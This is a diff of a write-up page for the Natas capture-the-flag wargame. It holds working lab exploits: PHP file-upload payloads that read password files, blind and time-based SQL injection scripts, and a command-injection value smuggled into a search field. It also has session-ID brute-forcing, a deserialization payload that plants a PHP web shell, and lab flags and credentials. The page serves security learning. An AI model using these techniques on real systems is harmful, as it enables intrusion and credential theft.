@@ -5,7 +5,7 @@ title: Natas
 
             <!-- Intro -->
             <section id="intro">
-                <img src="../images/projects/natas.jpg" width="100%" height="250px" />
+                <img src="/images/projects/natas.jpg" width="100%" height="250px" />
                 <header class="major">
                     <h2>Natas CTF</h2>
                 </header>
@@ -201,12 +201,10 @@ title: Natas
                 <h4>http://natas12.natas.labs.overthewire.org</h4>
                 So the upload system takes our file, puts it somewhere without much of a check about what it is, and gives us back a link. First idea is to directly upload a php file that echoes back the password file. However, the file is saved in a jpg format and therefore not interpreted.<br>
                 Luckily, the format can be changed client side: with the developer tools in the browser we can look for the form input tags and set the file extension form jpg to php, and now clicking on the link will give back the flag.
-                <pre class="brush: php">
-                    <?php
-                    $homepage = file_get_contents('/etc/natas_webpass/natas13');
-                    echo $homepage;
-                    ?>
-                </pre>
+                <pre><code class="html">&lt;?php
+$homepage = file_get_contents('/etc/natas_webpass/natas13');
+echo $homepage;
+?&gt;</code></pre>
                 <!-- FLAG: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY -->
             </section>
 
@@ -217,12 +215,10 @@ title: Natas
                 <h4>http://natas13.natas.labs.overthewire.org</h4>
                 The first part of this challenge is exactly the same as before: create the php file, modify the form input field and profit.<br>
                 However, befor profiting there is one additinal little step: the source code actually checks that we are really uploading a jpg file. To convince the server that we are playing it fair, we can mask our php file as a jpg using magic numbers: these are numbers that are usually at the start of a file and identify its type. For jpg, the value is 0xFFD8FFDB. It is enough to open our php file with a hex editor and prepend it with these bytes to be able to upload it without problems.
-                <pre class="brush: php">
-                    <?php
-                    $homepage = file_get_contents('/etc/natas_webpass/natas14');
-                    echo $homepage;
-                    ?>
-                </pre>
+                <pre><code class="html">&lt;?php
+$homepage = file_get_contents('/etc/natas_webpass/natas14');
+echo $homepage;
+?&gt;</code></pre>
                 <!-- FLAG: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 -->
             </section>
 
@@ -244,27 +240,25 @@ title: Natas
                 This challenge is a trickier version of SQL injection, because it is blind. This means that to get the information that we need we have to extrapolate it from other data. In this case, we have to build the password char by char, using a query like <code>natas16" and password like binary 'x%'</code>. We know that the 'password' column exists thanks to the comment in the source code, and with the 'LIKE' command we will get an answer only when the letters are correct (the % is a regex for 'doesn't matter what follows').<br>
                 We will use the Intruder from Burp, and start a sniper attack where we use our query with x as all the letters of the alphaber, both small and capital (we can distinguish thanks to the BINARY instruction), and numbers. To identify the proper letter we check the length of the response. When we know the first letter, we move on changing the query as in <code>natas16" and password like 'Ax%'</code>. We will have to repeat this 32 times to get the entire flag: a python script comes in handy. The authorization and the other data comes from a request intercepted with Burp, copied as curl and translated to python by a service like <a html="https://curl.trillworks.com/">cURL to Python</a>
 
-                <pre class="brush: python">
-                    import requests
+                <pre><code class="python">import requests
 
-                    letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
+letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
 
-                    headers = {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                        'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==',
-                    }
+headers = {
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==',
+}
 
-                    pwd = ''
-                    for i in range(0,32):
-                        for l in letters:
-                            data = 'username=natas16" and password like binary "' + pwd + l + '%"; #'
-                            response = requests.post('http://natas15.natas.labs.overthewire.org', headers=headers, data=data)
-                            if 'exists' in response.text:
-                                pwd += l
-                                continue
+pwd = ''
+for i in range(0,32):
+    for l in letters:
+        data = 'username=natas16" and password like binary "' + pwd + l + '%"; #'
+        response = requests.post('http://natas15.natas.labs.overthewire.org', headers=headers, data=data)
+        if 'exists' in response.text:
+            pwd += l
+            continue
 
-                    print(pwd)
-                </pre>
+print(pwd)</code></pre>
                 <!-- FLAG: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh -->
             </section>
 
@@ -276,32 +270,30 @@ title: Natas
                 We look back at challenges 09 and 10, but this time we are even more restricted in the characters that we are allowed to use. Interestingly, the dollar character is not filtered, and this allows us to executed some commands. What we will do is similar to the last challenge: a blind grep.<br>
                 We first look for a string that only returns one word, like 'doomed'. And then we append a grep command that will check if the password starts with the letter(s) that we are looking up in that iteration. If the letter sequence is right, than the result of the search will be empty; if the letter sequence is wrong, then we will be returned 'doomed'.
                 
-                <pre class="brush: python">
-                    import requests
+                <pre><code class="python">import requests
 
-                    letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
+letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
 
-                    headers = {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                        'Authorization': 'Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==',
-                    }
+headers = {
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Authorization': 'Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==',
+}
 
-                    pwd = ''
-                    for i in range(0,32):
-                        for l in letters:
+pwd = ''
+for i in range(0,32):
+    for l in letters:
 
-                            params = (
-                                ('needle', 'doomed$(grep ^' + pwd + l + ' /etc/natas_webpass/natas17)'),
-                                ('submit', 'Search'),
-                            )
+        params = (
+            ('needle', 'doomed$(grep ^' + pwd + l + ' /etc/natas_webpass/natas17)'),
+            ('submit', 'Search'),
+        )
 
-                            response = requests.get('http://natas16.natas.labs.overthewire.org/index.php', headers=headers, params=params)
-                            if 'doomed' not in response.text:
-                                pwd += l
-                                continue
+        response = requests.get('http://natas16.natas.labs.overthewire.org/index.php', headers=headers, params=params)
+        if 'doomed' not in response.text:
+            pwd += l
+            continue
 
-                    print(pwd)
-                </pre>
+print(pwd)</code></pre>
                 <!-- FLAG: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw  -->
             </section>
 
@@ -313,30 +305,28 @@ title: Natas
                 Yet again a blind SQL injection. Main problem is, that we don't have any output helping us detecting whether our guess is right or wrong. Instead, we can use timing: if our guess is right, wait 1 seconds before answering.<br>
                 To achieve this behavior, we can use the following query: <code>username=natas18" and password like binary "' + pwd + l + '%" and sleep(1); #</code>. Thanks to lazy execution (as soon as the value is known the evaluation stops, meaning that as soon as a clause of an AND is false the evaluation stops) the query will sleep only if our guess is right.
                 
-                <pre class="brush: python">
-                    import requests
-                    import time
+                <pre><code class="python">import requests
+import time
 
-                    letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
+letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
 
-                    headers = {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                        'Authorization': 'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==',
-                    }
+headers = {
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Authorization': 'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==',
+}
 
-                    pwd = ''
-                    for i in range(0,32):
-                        for l in letters:
-                            data = 'username=natas18" and password like binary "' + pwd + l + '%" and sleep(1); #'
-                            start_time = time.time()
-                            response = requests.post('http://natas17.natas.labs.overthewire.org', headers=headers, data=data)
-                            elapsed_time = time.time() - start_time
-                            if elapsed_time > 1:
-                                pwd += l
-                                continue
+pwd = ''
+for i in range(0,32):
+    for l in letters:
+        data = 'username=natas18" and password like binary "' + pwd + l + '%" and sleep(1); #'
+        start_time = time.time()
+        response = requests.post('http://natas17.natas.labs.overthewire.org', headers=headers, data=data)
+        elapsed_time = time.time() - start_time
+        if elapsed_time > 1:
+            pwd += l
+            continue
 
-                    print(pwd)
-                </pre>
+print(pwd)</code></pre>
                 <!-- FLAG: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP  -->
             </section>
 
@@ -348,27 +338,25 @@ title: Natas
                 The trick is that the username and password do not matter! The authentication assigns you a session ID, and that is what is checked on the backend. We can see in the source code that the pool of IDs is just up to 640, and therefore we can bruteforce them.<br>
                 We intercept the request with Burp, translate it to python and go through all the possible values for the cookie, until we find one that tells us we are admin.
                 
-                <pre class="brush: python">
-                    import requests
+                <pre><code class="python">import requests
 
-                    headers = {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                        'Authorization': 'Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==',
-                        }
+headers = {
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Authorization': 'Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==',
+    }
 
-                    data = 'username=admin&password=xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
+data = 'username=admin&password=xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
 
-                    for i in range(1,641):
-                        cookies = {
-                        'PHPSESSID': str(i),
-                        }
+for i in range(1,641):
+    cookies = {
+    'PHPSESSID': str(i),
+    }
 
-                        response = requests.post('http://natas18.natas.labs.overthewire.org/index.php', headers=headers, cookies=cookies, data=data)
+    response = requests.post('http://natas18.natas.labs.overthewire.org/index.php', headers=headers, cookies=cookies, data=data)
 
-                        if 'regular user' not in response.text:
-                            print(response.text)
-                            exit()
-                </pre>
+    if 'regular user' not in response.text:
+        print(response.text)
+        exit()</code></pre>
                 <!-- FLAG: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs  -->
             </section>
 
@@ -380,29 +368,27 @@ title: Natas
                 The trick is the same as the last challenge, but this time we can't take a look at the code and the session ID is no more just a number. After inspecting a few requests with burp, it seems that the new id has the following structure: number-givenUsername. This can be seen by taking the cookie value and decoding it as ASCII hex.<br>
                 Assuming that the numbers are still up to 640, we want to try all of them with the admin username. The trickier part is to tell python to encode everything in hex.
                 
-                <pre class="brush: python">
-                    import requests
-                    import codecs
+                <pre><code class="python">import requests
+import codecs
 
-                    headers = {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                        'Authorization': 'Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==',
-                        }
+headers = {
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Authorization': 'Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==',
+    }
 
-                    data = 'username=admin&password=xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
+data = 'username=admin&password=xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
 
-                    for i in range(1,641):
-                        session = codecs.encode(bytes(str(i) + '-admin', 'utf-8'),'hex')
-                        cookies = {
-                        'PHPSESSID': session.decode("utf-8")
-                        }
+for i in range(1,641):
+    session = codecs.encode(bytes(str(i) + '-admin', 'utf-8'),'hex')
+    cookies = {
+    'PHPSESSID': session.decode("utf-8")
+    }
 
-                        response = requests.post('http://natas19.natas.labs.overthewire.org/index.php', headers=headers, cookies=cookies, data=data)
+    response = requests.post('http://natas19.natas.labs.overthewire.org/index.php', headers=headers, cookies=cookies, data=data)
 
-                        if 'regular' not in response.text:
-                            print(response.text)
-                            exit()
-                </pre>
+    if 'regular' not in response.text:
+        print(response.text)
+        exit()</code></pre>
                 <!-- FLAG: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF -->
             </section>
 
@@ -480,24 +466,22 @@ title: Natas
                 Thanks to <a href="https://n0j.github.io/2017/07/19/otw-natas-26.html">n0j</a> for the writeup.<br>
                 There are three interesting things in this challenge: there is serialization ongoing, there is a logging class that has the methods used after serialization, and we have access to the serialized data stored in the cookie.<br>
                 Although the cookie is expected to contain only the data for the drawings, upon deserialization whatever is contained in the cookie will be run through the constructors and destructors methods. So we can create a logger object so that on destruction our target file will be dumped into something that we can access. The following code is from n0j's page:
-                <pre class="brush: php">
-                    <?php
-                    class Logger {
-                        private $logFile;
-                        private $initMsg;
-                        private $exitMsg;
-                        
-                        function __construct(){
-                            $this->initMsg="blabla\n";
-                            $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\n";
-                            $this->logFile = "/var/www/natas/natas26/img/pwd.php";
-                        }
-                    }
+                <pre><code class="html">&lt;?php
+class Logger {
+    private $logFile;
+    private $initMsg;
+    private $exitMsg;
+    
+    function __construct(){
+        $this->initMsg="blabla\n";
+        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\n";
+        $this->logFile = "/var/www/natas/natas26/img/pwd.php";
+    }
+}
 
-                    $o = new Logger();
-                    print base64_encode(serialize($o))."\n";
-                    ?>
-                </pre>
+$o = new Logger();
+print base64_encode(serialize($o))."\n";
+?&gt;</code></pre>
                 This gives us the content of the cookie. We now have to intercept a request, change the cookie with our own content (make sure special characters are URL encoded), forward it and then visit our target page 'img/pwd.php'
                 <!-- FLAG: 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ -->
             </section>
